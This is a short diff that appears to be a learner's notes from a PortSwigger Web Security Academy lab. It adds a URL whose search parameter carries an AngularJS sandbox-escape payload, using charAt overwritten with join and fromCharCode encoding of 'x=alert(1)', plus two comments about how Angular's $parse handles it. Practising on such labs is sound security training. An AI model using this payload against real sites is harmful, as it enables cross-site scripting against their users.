@@ -1,0 +1,4 @@
+https://ac601fec1e42403881af0cac00250087.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 
+
+// Check how is the code rendered in the <script> in response page
+// The payload is processed by Angular's $parse(key)
